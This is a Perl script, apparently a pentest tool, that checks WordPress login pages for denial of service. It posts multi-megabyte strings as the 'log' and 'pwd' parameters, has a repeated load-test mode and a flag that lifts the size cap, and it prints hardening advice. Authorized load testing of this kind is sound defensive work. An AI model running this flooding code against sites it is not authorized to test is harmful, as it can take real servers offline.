#!/usr/bin/perl
#┌────────────────────────────────────────────────────────────────────────┐
#│                                                                        │
#│         ███████╗████████╗ ██████╗ ███████╗██████╗ ████████╗██╗         │
#│         ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║         │
#│         ███████╗   ██║   ██║   ██║█████╗  ██████╔╝   ██║   ██║         │
#│         ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══██╗   ██║   ██║         │
#│         ███████║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║         │
#│         ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝         │
#│                                                                        │
#│                    "old school, still root"                            │
#│                    "stoerti - the jobless hacker"                      │
#│                                                                        │
#│    ┌──────────────────────────────────────────────────────────────┐    │
#│    │  40 years in the trenches.     │  6 months unemployed in DE. │    │
#│    │  They fired the one who knew.  │  This is my legacy.         │    │
#│    │                   -- no patches for reality --               │    │
#│    └──────────────────────────────────────────────────────────────┘    │
#│                                                                        │
#└────────────────────────────────────────────────────────────────────────┘
# MIT License
#
# Copyright (c) 2026 Klaus Baumdick
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is intended solely for educational purposes and authorized
# penetration testing in controlled environments.
#
# Unauthorized use of this script against systems without explicit written
# permission is illegal and may result in criminal or civil liability.
#
# The author assumes no responsibility for any misuse, damages, or legal
# consequences arising from the use of this script.
#
# USE AT YOUR OWN RISK.
# ============================================================================
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
use Time::HiRes qw(time);
use Getopt::Long;
use Term::ANSIColor qw(:constants);
use JSON::PP;
use File::Basename;

# ======================================================================
# WORDPRESS LOGIN PARAMETER LENGTH DOS TESTER
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Testet ob extrem lange Login-Parameter zu Lastproblemen führen
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# JSON-Output
# perl wp-dos-test.pl --url https://example.com --output ergebnis.json

# Safe-Mode mit 50 MB
# perl wp-dos-test.pl --url https://example.com --size 50 --verbose

# Nur pwd testen
# perl wp-dos-test.pl --url https://example.com --no-test-log

# Lasttest mit 20 Iterationen
# perl wp-dos-test.pl --url https://example.com --iterations 20

# Mit eigenem User-Agent
# perl wp-dos-test.pl --url https://example.com --user-agent "MyTest/1.0"


# Farben für bessere Lesbarkeit
my $GREEN = GREEN;
my $RED = RED;
my $YELLOW = YELLOW;
my $CYAN = CYAN;
my $RESET = RESET;

# ======================================================================
# KONFIGURATION
# ======================================================================
my %config = (
    target_url   => '',
    login_path   => '/wp-login.php',
    size         => 10,           # MB
    iterations   => 1,
    timeout      => 30,
    verbose      => 0,
    quiet        => 0,
    test_log     => 1,
    test_pwd     => 1,
    output_json  => '',
    user_agent   => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    delay        => 1,            # Sekunden zwischen Tests
    max_size     => 100,           # Maximale Testgröße in MB
    safe_mode    => 0,
);

# ======================================================================
# KOMMANDOZEILENOPTIONEN
# ======================================================================
GetOptions(
    'url=s'           => \$config{target_url},
    'login=s'         => \$config{login_path},
    'size=i'          => \$config{size},
    'iterations=i'    => \$config{iterations},
    'timeout=i'       => \$config{timeout},
    'verbose'         => \$config{verbose},
    'quiet'           => \$config{quiet},
    'test-log!'       => \$config{test_log},
    'test-pwd!'       => \$config{test_pwd},
    'output=s'        => \$config{output_json},
    'user-agent=s'    => \$config{user_agent},
    'delay=i'         => \$config{delay},
    'safe-mode'       => \$config{safe_mode},
    'help'            => sub { print_help(); exit 0; }
) or die "❌ Fehler in Kommandozeilenoptionen. Verwende --help für Hilfe.\n";

# ======================================================================
# VALIDIERUNG
# ======================================================================
validate_config();

# ======================================================================
# INITIALISIERUNG
# ======================================================================
my $start_time = time();
my $full_login_url = $config{target_url} . $config{login_path};
my @results = ();

show_banner();
print_info("Ziel: $full_login_url");
print_info("Testgröße: $config{size} MB");
print_info("Timeout: $config{timeout} Sekunden");

# ======================================================================
# 1. VERBINDUNG TESTEN
# ======================================================================
print_section("VERBINDUNG TESTEN");

my $ua = create_user_agent();
my $test_response = $ua->get($full_login_url);

if (!$test_response->is_success) {
    print_error("Login-Seite nicht erreichbar (HTTP " . $test_response->code . ")");
    print_tip("Prüfe URL und Pfad: $full_login_url");
    exit 1;
}

print_success("Login-Seite erreichbar (HTTP " . $test_response->code . ")");

# WordPress erkennen
my $is_wordpress = 0;
if ($test_response->content =~ /wordpress/i ||
    $test_response->content =~ /wp-content/i ||
    $test_response->content =~ /wp-includes/i) {
    $is_wordpress = 1;
    print_success("WordPress erkannt");
} else {
    print_warning("Kein WordPress erkannt - trotzdem testen?");
    if (!$config{quiet} && !$config{safe_mode}) {
        print "Fortfahren? (j/N): ";
        my $answer = <STDIN>;
        chomp $answer;
        if ($answer !~ /^j/i) {
            print_info("Abgebrochen");
            exit 0;
        }
    }
}

# ======================================================================
# 2. TESTDATEN GENERIEREN
# ======================================================================
print_section("TESTDATEN GENERIEREN");

my $test_data = generate_test_data($config{size});
my $actual_size = length($test_data);
print_success(sprintf("Testdaten generiert: %.2f MB", $actual_size / (1024*1024)));

# ======================================================================
# 3. BASELINE TEST
# ======================================================================
print_section("BASELINE TEST");

my $baseline = run_baseline_test($ua, $full_login_url);
print_success(sprintf("Baseline Antwortzeit: %.3f Sekunden", $baseline->{duration}));

# ======================================================================
# 4. TESTS DURCHFÜHREN
# ======================================================================
print_section("TESTS DURCHFÜHREN");

my @tests = prepare_tests($test_data);
my $found_vulnerability = 0;

foreach my $test (@tests) {
    print_info("Teste: $test->{name}");

    my $result = run_single_test($test, $baseline);
    push @results, $result;

    if ($result->{warning}) {
        $found_vulnerability++;
    }

    # Kurze Pause zwischen Tests
    sleep($config{delay}) if $config{delay} > 0;
}

# ======================================================================
# 5. LASTTEST (OPTIONAL)
# ======================================================================
if ($config{iterations} > 1) {
    print_section("LASTTEST");
    my $load_result = run_load_test();
    push @results, $load_result if $load_result;
}

# ======================================================================
# 6. ERGEBNISSE
# ======================================================================
print_section("ERGEBNISSE");

show_results_summary(\@results, $found_vulnerability);

# ======================================================================
# 7. JSON OUTPUT
# ======================================================================
if ($config{output_json}) {
    save_json_output(\@results, $found_vulnerability);
}

# ======================================================================
# 8. EMPFEHLUNGEN
# ======================================================================
print_recommendations($found_vulnerability);

# ======================================================================
# ABSCHLUSS
# ======================================================================
my $total_time = time() - $start_time;
print_info(sprintf("Gesamtzeit: %.2f Sekunden", $total_time));

exit($found_vulnerability ? 1 : 0);

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub validate_config {
    if (!$config{target_url}) {
        print_error("Keine Ziel-URL angegeben");
        print "Verwendung: $0 --url https://example.com [Optionen]\n";
        print "Verwende --help für ausführliche Hilfe.\n";
        exit 1;
    }

    # URL normalisieren
    $config{target_url} =~ s/\/$//;

    if ($config{target_url} !~ /^https?:\/\//) {
        $config{target_url} = 'https://' . $config{target_url};
        print_warning("URL zu https:// ergänzt");
    }

    if ($config{size} > $config{max_size} && !$config{safe_mode}) {
        print_warning("Testgröße $config{size} MB ist sehr groß!");
        print "Maximal erlaubt: $config{max_size} MB\n";
        print "Mit --safe-mode überschreiben oder kleineren Wert wählen.\n";
        exit 1;
    }

    if ($config{iterations} > 100) {
        print_warning("Sehr viele Iterationen ($config{iterations})");
        print "Fortfahren? (j/N): ";
        my $answer = <STDIN>;
        chomp $answer;
        exit 0 unless $answer =~ /^j/i;
    }
}

sub create_user_agent {
    my $ua = LWP::UserAgent->new(
        timeout => $config{timeout},
        agent => $config{user_agent},
        max_size => 0,
        keep_alive => 0,
        cookie_jar => HTTP::Cookies->new(),
    );

    # SSL-Optionen für HTTPS
    $ua->ssl_opts(
        verify_hostname => 0,
        SSL_verify_mode => 0,
    );

    return $ua;
}

sub generate_test_data {
    my ($size_mb) = @_;

    my $megabyte = 1024 * 1024;
    my $target_size = $size_mb * $megabyte;

    # Progress-Anzeige
    print "Generiere $size_mb MB Testdaten... ";

    my $chunk = 'A' x (64 * 1024);  # 64 KB Chunks
    my $data = '';

    while (length($data) < $target_size) {
        $data .= $chunk;
        print "." if length($data) % ($megabyte * 10) == 0;
    }

    print " fertig!\n";

    return substr($data, 0, $target_size);
}

sub run_baseline_test {
    my ($ua, $url) = @_;

    my $start = time();
    my $resp = $ua->post($url,
        'Content_Type' => 'application/x-www-form-urlencoded',
        'Content' => {
            'log' => 'testuser',
            'pwd' => 'testpass',
            'wp-submit' => 'Log In',
            'testcookie' => '1'
        }
    );
    my $duration = time() - $start;

    return {
        duration => $duration,
        status => $resp->code,
        success => $resp->is_success ? 1 : 0,
    };
}

sub prepare_tests {
    my ($test_data) = @_;
    my @tests;

    if ($config{test_log}) {
        push @tests, {
            name => "Parameter: 'log' ($config{size} MB)",
            type => 'log',
            data => {
                'log' => $test_data,
                'pwd' => 'test',
                'wp-submit' => 'Log In',
                'testcookie' => '1'
            }
        };
    }

    if ($config{test_pwd}) {
        push @tests, {
            name => "Parameter: 'pwd' ($config{size} MB)",
            type => 'pwd',
            data => {
                'log' => 'test',
                'pwd' => $test_data,
                'wp-submit' => 'Log In',
                'testcookie' => '1'
            }
        };
    }

    return @tests;
}

sub run_single_test {
    my ($test, $baseline) = @_;

    my $test_ua = create_user_agent();
    my $result = {
        test => $test->{name},
        type => $test->{type},
        start_time => time(),
        warning => 0,
        messages => [],
    };

    # Payload-Größe berechnen
    my $post_data = '';
    foreach my $key (keys %{$test->{data}}) {
        $post_data .= "$key=" . $test->{data}->{$key} . "&";
    }
    chop($post_data);

    $result->{payload_size} = length($post_data);

    if ($config{verbose}) {
        print_info("Payload-Größe: " . sprintf("%.2f MB", $result->{payload_size} / (1024*1024)));
    }

    # Request senden
    my $start = time();
    my $response;
    my $timeout_occurred = 0;

    eval {
        local $SIG{ALRM} = sub { die "timeout\n"; };
        alarm($config{timeout} + 5);
        $response = $test_ua->post($full_login_url,
            'Content_Type' => 'application/x-www-form-urlencoded',
            'Content' => $test->{data}
        );
        alarm(0);
    };

    $result->{duration} = time() - $start;

    if ($@ && $@ =~ /timeout/) {
        $timeout_occurred = 1;
        $result->{status} = 'timeout';
        $result->{warning} = 1;
        push @{$result->{messages}}, "Timeout nach $result->{duration}s";
        print_warning(sprintf("TIMEOUT nach %.2f Sekunden!", $result->{duration}));
    } else {
        $result->{status} = $response->code;
        $result->{success} = $response->is_success ? 1 : 0;

        print_success(sprintf("Antwortzeit: %.3f Sekunden", $result->{duration}));
        print_info("HTTP Status: " . $response->code);

        # Vergleich mit Baseline
        my $factor = $result->{duration} / $baseline->{duration};
        if ($factor > 10) {
            $result->{warning} = 1;
            push @{$result->{messages}}, sprintf("Stark erhöhte Antwortzeit (%.1fx Baseline)", $factor);
            print_warning(sprintf("Stark erhöhte Antwortzeit (%.1fx Baseline)", $factor));
        }

        if ($response->code >= 500) {
            $result->{warning} = 1;
            push @{$result->{messages}}, "Server-Fehler (HTTP $response->code)";
            print_warning("Server-Fehler! Möglicherweise abgestürzt.");
        }
    }

    return $result;
}

sub run_load_test {
    print_info("Führe Lasttest mit $config{iterations} Iterationen durch...");

    my $small_data = 'A' x (5 * 1024 * 1024);  # 5 MB
    my $success = 0;
    my $fail = 0;
    my $total_time = 0;

    for (my $i = 1; $i <= $config{iterations}; $i++) {
        print "  Iteration $i/$config{iterations}\r";

        my $load_ua = create_user_agent();

        my $start = time();
        my $resp = $load_ua->post($full_login_url,
            'Content_Type' => 'application/x-www-form-urlencoded',
            'Content' => {
                'log' => $small_data,
                'pwd' => 'test',
                'wp-submit' => 'Log In',
                'testcookie' => '1'
            }
        );
        my $duration = time() - $start;

        $total_time += $duration;

        if ($resp->is_success) {
            $success++;
        } else {
            $fail++;
        }
    }

    print "\n";
    my $avg_time = $total_time / $config{iterations};

    print_success("Erfolgreich: $success");
    if ($fail > 0) {
        print_warning("Fehlgeschlagen: $fail");
    }
    print_info(sprintf("Durchschnitt: %.3f Sekunden", $avg_time));

    return {
        test => 'Load Test',
        type => 'load',
        success_count => $success,
        fail_count => $fail,
        avg_duration => $avg_time,
        warning => ($fail > 0) ? 1 : 0,
    };
}

sub show_results_summary {
    my ($results, $vuln_count) = @_;

    if ($vuln_count > 0) {
        print_color("$RED❗ KRITISCHE WARNUNGEN: $vuln_count$RESET");
        print "Der Server zeigt Anzeichen von DoS-Anfälligkeit:\n";

        foreach my $r (@$results) {
            if ($r->{warning} && $r->{messages}) {
                foreach my $msg (@{$r->{messages}}) {
                    print "  • $msg\n";
                }
            }
        }
    } else {
        print_success("Keine Auffälligkeiten gefunden");
        print "Der Server scheint gegen diese Art von Angriff geschützt.\n";
    }
}

sub save_json_output {
    my ($results, $vuln_count) = @_;

    my $output = {
        timestamp => scalar(localtime()),
        target => $full_login_url,
        config => \%config,
        results => $results,
        vulnerability_found => $vuln_count ? JSON::PP::true : JSON::PP::false,
        total_time => time() - $start_time,
    };

    my $json = JSON::PP->new->pretty->encode($output);

    open(my $fh, '>', $config{output_json}) or die "Kann Datei nicht öffnen: $!";
    print $fh $json;
    close($fh);

    print_success("Ergebnisse gespeichert: $config{output_json}");
}

sub print_recommendations {
    my ($vuln_found) = @_;

    print_section("EMPFEHLUNGEN");

    my @recommendations = (
        "• WordPress und alle Plugins aktuell halten",
        "• Webserver-Limits konfigurieren:",
        "  - Apache: LimitRequestBody 10485760 (10 MB)",
        "  - Nginx: client_max_body_size 10M",
        "  - PHP: post_max_size = 10M",
        "• Fail2Ban für WordPress-Login einrichten",
        "• WAF (Web Application Firewall) verwenden",
        "• Login-Versuche protokollieren und überwachen",
    );

    if ($vuln_found) {
        unshift @recommendations, "• 🔴 SOFORT HANDELN! Server ist anfällig!";
    }

    foreach (@recommendations) {
        print "$_\n";
    }
}

sub print_help {
    print <<"HELP";
================================================================================
WORDPRESS LOGIN PARAMETER LENGTH DOS TESTER
================================================================================

BESCHREIBUNG:
  Testet ob extrem lange Login-Parameter ('log' und 'pwd') zu
  Lastproblemen oder Denial-of-Service führen können.

VERWENDUNG:
  $0 --url <wordpress-url> [Optionen]

ERFORDERLICH:
  --url URL        WordPress-URL (z.B. https://example.com)

OPTIONEN:
  --login PATH     Login-Pfad (Default: /wp-login.php)
  --size N         Testgröße in MB (Default: 10, Max: 100)
  --iterations N   Lasttest-Iterationen (Default: 1)
  --timeout N      Timeout in Sekunden (Default: 30)
  --delay N        Pause zwischen Tests (Default: 1 Sekunde)

  --test-log       'log' Parameter testen (Default: an)
  --test-pwd       'pwd' Parameter testen (Default: an)
  --[no]test-log   Ausschalten: --no-test-log

  --verbose        Ausführliche Ausgabe
  --quiet          Minimale Ausgabe
  --safe-mode      Größenbeschränkung umgehen (Vorsicht!)
  --output DATEI   Ergebnisse als JSON speichern
  --user-agent UA  Eigenen User-Agent verwenden

  --help           Diese Hilfe anzeigen

BEISPIELE:
  # Einfacher Test
  $0 --url https://example.com

  # Test mit 50 MB
  $0 --url https://example.com --size 50 --verbose

  # Nur 'pwd' Parameter testen
  $0 --url https://example.com --no-test-log

  # Lasttest mit 10 Iterationen
  $0 --url https://example.com --iterations 10

  # Ergebnisse speichern
  $0 --url https://example.com --output ergebnis.json

HINWEIS:
  • Nur auf eigenen oder autorisierten Systemen testen!
  • Große Werte bei --size können den Server belasten
  • Bei --safe-mode können sehr große Payloads gesendet werden
  • CC BY-NC-ND 4.0 Lizenz - Nur für Bildungszwecke

================================================================================
HELP
    exit 0;
}

sub show_banner {
    print <<"BANNER";
$CYAN================================================================================
WORDPRESS LOGIN PARAMETER LENGTH DOS TESTER v2.0
================================================================================$RESET
BANNER
}

sub print_section {
    my ($title) = @_;
    print "\n$CYAN▶ $title$RESET\n";
    print "-" x 40 . "\n";
}

sub print_success {
    my ($msg) = @_;
    print "$GREEN✓ $msg$RESET\n" unless $config{quiet};
}

sub print_error {
    my ($msg) = @_;
    print "$RED❌ $msg$RESET\n";
}

sub print_warning {
    my ($msg) = @_;
    print "$YELLOW⚠️  $msg$RESET\n";
}

sub print_info {
    my ($msg) = @_;
    print "  $msg\n" if $config{verbose} && !$config{quiet};
}

sub print_tip {
    my ($msg) = @_;
    print "  💡 $msg\n" if !$config{quiet};
}

sub print_color {
    my ($msg) = @_;
    print "$msg\n";
}

__END__
